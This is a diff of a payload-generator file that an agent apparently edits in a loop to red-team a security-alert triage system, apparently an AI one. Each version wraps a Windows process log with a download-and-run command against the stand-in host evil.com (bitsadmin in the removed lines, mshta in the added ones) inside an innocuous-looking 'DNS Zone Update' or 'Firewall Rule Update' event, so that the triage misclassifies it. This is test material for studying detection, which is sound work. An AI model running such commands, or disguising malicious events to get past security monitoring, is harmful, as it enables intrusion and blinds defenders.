@@ -4,22 +4,22 @@ MUTABLE FILE — The agent modifies this to generate adversarial payloads.
 
 
 def generate_payload() -> dict:
-    # Experiment 15: bitsadmin transfer + dns_update evasion + phantom IPs
+    # Experiment 16: mshta http + firewall_update evasion + phantom IPs
     return {
-        "task_type": "dns_update",
+        "task_type": "firewall_update",
         "severity": "info",
         "siem_event": {
-            "title": "DNS Zone Update",
-            "source_ip": "10.30.0.1",
-            "destination_ip": "10.30.0.2",
-            "username": "svc_dns",
-            "hostname": "dns-srv-01",
-            "rule_name": "DNSUpdate",
+            "title": "Firewall Rule Update",
+            "source_ip": "10.40.0.5",
+            "destination_ip": "10.40.0.6",
+            "username": "svc_firewall",
+            "hostname": "fw-mgmt-01",
+            "rule_name": "FirewallConfig",
             "raw_log": (
-                "EventID=4688 Process=bitsadmin.exe "
-                "CommandLine=bitsadmin /transfer malware "
-                "http://evil.com/payload.exe C:\\temp\\svchost.exe "
-                "User=SYSTEM ParentProcess=cmd.exe"
+                "EventID=4688 Process=mshta.exe "
+                "CommandLine=mshta http://evil.com/payload.hta "
+                "User=DOMAIN\\admin ParentProcess=explorer.exe "
+                "WorkingDirectory=C:\\Users\\admin\\Desktop"
             ),
         },
     }
